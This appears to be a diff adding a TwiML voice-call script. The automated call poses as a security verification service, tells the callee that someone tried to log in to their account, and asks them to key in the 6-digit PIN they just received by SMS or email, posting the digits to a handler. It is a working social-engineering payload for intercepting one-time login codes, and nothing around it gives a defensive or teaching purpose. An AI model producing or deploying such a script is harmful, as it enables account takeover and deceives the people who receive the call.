@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+  <Gather numDigits="6" action="/handle-pin.xml" method="POST">
+     <Pause length="2"/>
+    <Say>Hello, and welcome to our verification service. You are receiving this call because someone has tried to log in to your account on an unknown device. For your security purposes, please enter your 6-digit PIN number that you received either by email or SMS/text to resolve these security measures. After you have typed in the correct 6-digit PIN please wait for verification.</Say>
+  </Gather>
+</Response>
